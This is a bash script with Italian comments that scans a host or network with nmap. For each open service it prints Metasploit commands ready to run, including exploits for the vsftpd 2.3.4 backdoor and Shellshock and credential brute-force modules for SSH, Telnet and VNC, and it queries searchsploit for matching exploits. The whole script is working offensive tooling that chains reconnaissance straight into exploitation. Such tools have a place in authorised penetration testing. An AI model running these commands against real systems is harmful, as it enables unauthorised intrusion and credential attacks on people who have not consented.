#!/bin/bash

# ==========================================================
# Bash Port & Exploit Scanner
# Scansiona host/rete con Nmap, mostra porte e servizi,
# e propone exploit/metasploit correlati.
# ==========================================================

msf_suggestion() {
    case "$1" in
        ftp)
            echo " msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST \$TARGET; exploit'"
            ;;
        ssh)
            echo " msfconsole -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS \$TARGET; run'"
            ;;
        telnet)
            echo " msfconsole -x 'use auxiliary/scanner/telnet/telnet_login; set RHOSTS \$TARGET; run'"
            ;;
        smtp)
            echo " msfconsole -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS \$TARGET; run'"
            ;;
        http)
            echo " msfconsole -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOST \$TARGET; exploit'"
            ;;
        mysql)
            echo " msfconsole -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS \$TARGET; run'"
            ;;
        postgresql)
            echo " msfconsole -x 'use auxiliary/scanner/postgres/postgres_version; set RHOSTS \$TARGET; run'"
            ;;
        vnc)
            echo " msfconsole -x 'use auxiliary/scanner/vnc/vnc_login; set RHOSTS \$TARGET; run'"
            ;;
        *)
            echo " Nessun exploit Metasploit predefinito per $1"
            ;;
    esac
}

# ==========================================================
# INPUT UTENTE
# ==========================================================
read -p "Vuoi scansionare un singolo IP o una rete? (IP/rete) " CHOICE

if [[ "$CHOICE" =~ ^[Ii][Pp]$ ]]; then
    read -p "Inserisci l'IP: " TARGET
elif [[ "$CHOICE" =~ ^[Rr]ete$ ]]; then
    read -p "Inserisci la rete (es. 192.168.1.0/24): " TARGET
else
    echo "Scelta non valida."
    exit 1
fi

# ==========================================================
# SCANSIONE NMAP
# ==========================================================
echo "[*] Scansione in corso su $TARGET..."
echo "==== Risultati Scansione ===="

nmap -p- -sV --open "$TARGET" | awk '/^[0-9]+\/tcp/{print}' | while read -r line; do
    PORT=$(echo "$line" | awk '{print $1}')
    SERVICE=$(echo "$line" | awk '{print $3}')
    VERSION=$(echo "$line" | awk '{for (i=5; i<=NF; i++) printf $i " "; print ""}')

    echo "Target: $TARGET"
    echo "Porta: $PORT | Servizio: $SERVICE"
    echo "Versione: $VERSION"

    echo "Suggerimento exploit predefinito:"
    msf_suggestion "$SERVICE"
    echo ""

    # ======================================================
    # RICERCA EXPLOIT DINAMICA
    # ======================================================
    if command -v searchsploit >/dev/null 2>&1; then
        echo "[*] Ricerca con Searchsploit per: $SERVICE $VERSION"
        searchsploit "$SERVICE $VERSION" | head -n 10
    else
        echo "[!] Searchsploit non trovato, salto la ricerca locale."
    fi

    if command -v msfconsole >/dev/null 2>&1; then
        echo "[*] Comando Metasploit pronto:"
        echo " msfconsole -x 'search type:exploit $SERVICE $VERSION'"
    else
        echo "[!] Metasploit non installato, salto il comando."
    fi

    echo "---------------------------"
done
